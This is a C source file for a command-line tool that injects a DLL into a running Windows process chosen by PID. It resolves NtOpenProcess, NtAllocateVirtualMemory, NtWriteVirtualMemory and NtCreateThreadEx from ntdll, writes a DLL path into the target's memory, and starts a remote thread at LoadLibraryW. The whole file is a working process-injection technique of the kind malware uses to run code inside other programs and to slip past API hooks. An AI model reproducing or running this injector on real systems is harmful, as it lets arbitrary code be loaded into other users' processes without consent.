#include "NTDLL_Inject.h"

int main(int argc, char** argv) {
	if (argc < 2) {
		info("Usage: %s <PID>", argv[0]);
		return EXIT_FAILURE;
	}

	DWORD							PID						= atoi(argv[1]);
	HANDLE							hProcess				= NULL, hThread = NULL;
	HMODULE							hNTDLL					= NULL;

	NTSTATUS						status					= NULL;
	OBJECT_ATTRIBUTES				OA						= { sizeof(OA), NULL };
	CLIENT_ID						CID						= { (HANDLE)PID, NULL };

	PVOID							pvBaseAddr				= NULL;
	WCHAR							dllPath[MAX_PATH];
	SIZE_T							dllPathSize				= sizeof(dllPath);

	SIZE_T							bytesWritten			= NULL;
	NtOpenProcess					ntOpenProcess			= NULL;
	NtAllocateVirtualMemory			ntAllocateVirtualMemory = NULL;

	NtWriteVirtualMemory			ntWriteVirtualMemory	= NULL;
	NtCreateThreadEx				ntCreateThreadEx		= NULL;

	HMODULE							hKernel32				= NULL;
	FARPROC							lpLoadLibraryW			= NULL;
	DWORD							dPathlenght				= NULL;

	info("Got the PID! Trying to get a handle to the ntdll module...\n\t-->\tPID: %lu", PID);

	hNTDLL = GetModuleHandleW(L"ntdll");

	if (hNTDLL == NULL) {
		error("Couldn't get a handle to ntdll...\n\t-->\tError: 0x%x", GetLastError());
		goto CLEAN;
	}

	ok("Got the handle to NTDLL...\n\t-->\tHandle: 0x%p", hNTDLL);
	info("Now trying to get NTDLL functions...");

	info("Trying to get a handle to NtOpenProcess()...");
	ntOpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");

	if (ntOpenProcess == NULL) {
		error("Can't get a handle to NtOpenProcess()...\n\t-->\tError: 0x%x", GetLastError());
		goto CLEAN;
	}

	ok("Got a handle to NtOpenProcess()!\n\t-->\tHandle: 0x%p", ntOpenProcess);

	info("Trying to get a handle to NtAllocateVirtualMemory()...");
	ntAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");

	if (ntAllocateVirtualMemory == NULL) {
		error("Can't get a handle to NtAllocateVirtualMemory()...\n\t-->\tError: 0x%x", GetLastError());
		goto CLEAN;
	}

	ok("Got a handle to NtAllocateVirtualMemory()!\n\t-->\tHandle: 0x%p", ntAllocateVirtualMemory);

	info("Trying to get a handle to NtWriteVirtualMemory()...");
	ntWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");

	if (ntWriteVirtualMemory == NULL) {
		error("Can't get a handle to NtWriteVirtualMemory()...\n\t-->\tError: 0x%x", GetLastError());
		goto CLEAN;
	}

	ok("Got a handle to NtWriteVirtualMemory()!\n\t-->\tHandle: 0x%p", ntWriteVirtualMemory);

	info("Trying to get a handle to NtCreateThreadEx()...");
	ntCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");

	if (ntCreateThreadEx == NULL) {
		error("Can't get a handle to NtCreateThreadEx()...\n\t-->\tError: 0x%x", GetLastError());
		goto CLEAN;
	}

	ok("Got a handle to NtCreateThreadEx()!\n\t-->\tHandle: 0x%p", ntCreateThreadEx);
	info("Trying to get a handle to the kernel32.dll library...");

	hKernel32 = GetModuleHandle(L"kernel32.dll");
	if (hKernel32 == NULL) {
		error("Failed to get a handle to the kernel32.dll...\n\t-->\tError: 0x%X", GetLastError());

		return EXIT_FAILURE;
	}

	ok("Got the handle to the kernel32.dll!\n\t-->\tHandle: 0x%p", hKernel32);
	info("Trying to load the LoadLibraryW function...");

	lpLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
	if (lpLoadLibraryW == NULL) {
		error("Failed to the adress to the LoadLibraryW function...\n\t-->\tError: 0x%X", GetLastError());

		return EXIT_FAILURE;
	}

	ok("LoadLibraryW loaded succesfully!");
	ok("All functions loaded correctly! Time to let the injection begins...");

	info("Trying to get a handle to NaitDLL...");

	dPathlenght = GetFullPathNameW(L"C:\\Users\\chry\\source\\repos\\NaitDLL\\x64\\Release\\NaitDLL.dll", MAX_PATH, dllPath, NULL);

	if (dPathlenght == 0) {
		error("Can't get the path of NaitDLL...\n\t-->\tError: 0x%x", GetLastError());
		goto CLEAN;
	}

	ok("Got the path of NaitDLL!\n\t-->\tLength: %lu", dPathlenght);
	info("Trying to get a handle to the process...");

	status = ntOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);

	if (status != STATUS_SUCCESS) {
		error("Can't get a handle to the process...\n\t-->\tError: 0x%lx", status);
		goto CLEAN;
	}

	ok("Got a handle to the process!\n\t-->\tHandle: 0x%p", hProcess);

	info("Trying to allocate virtual memory...");
	status = ntAllocateVirtualMemory(hProcess, &pvBaseAddr, 0, &dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);

	if (status != STATUS_SUCCESS) {
		error("Can't allocate memory to the process...\n\t-->\tError: 0x%lx", status);
		goto CLEAN;
	}

	ok("Allocated memory to the process!");

	info("Trying to write memory to the process...");
	status = ntWriteVirtualMemory(hProcess, pvBaseAddr, dllPath, sizeof(dllPath), &bytesWritten);

	if (status != STATUS_SUCCESS) {
		error("Can't write memory to the process...\n\t-->\tError: 0x%lx", status);
		goto CLEAN;
	}

	ok("Wrote memory to the process!\n\t-->\tBytes written: %llu", bytesWritten);

	status = ntCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (LPTHREAD_START_ROUTINE)lpLoadLibraryW, pvBaseAddr, FALSE, NULL, NULL, NULL, NULL);
	if (status != STATUS_SUCCESS) {
		error("Can't create the thread...\n\t-->\tError: 0x%lx", status);
		goto CLEAN;
	}

	ok("Thread created!");
	info("Waiting for thread to finish...");

	WaitForSingleObject(hThread, INFINITE);
	info("Thread finished executing... cleaning up and exiting...");
	goto CLEAN;

CLEAN:
	CloseHandle(hThread);
	CloseHandle(hProcess);
	CloseHandle(hNTDLL);

	info("Exiting...");

	return EXIT_SUCCESS;
}